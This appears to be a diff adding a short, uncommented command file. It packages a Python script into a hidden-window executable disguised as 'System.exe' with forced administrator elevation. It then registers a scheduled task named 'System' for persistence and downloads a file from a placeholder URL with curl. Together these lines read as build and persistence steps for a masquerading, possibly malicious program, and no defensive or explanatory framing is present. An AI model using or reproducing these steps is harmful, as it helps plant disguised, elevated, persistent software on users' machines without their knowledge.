@@ -1,0 +1,5 @@
+pyinstaller -w -F --uac-admin -i="NONE" -n System.exe main.py
+
+Schtasks /create /xml "edited.xml" /F /TN "System"
+
+curl -o dir_for_file\file.jpg https:\\url.com\file.jpg
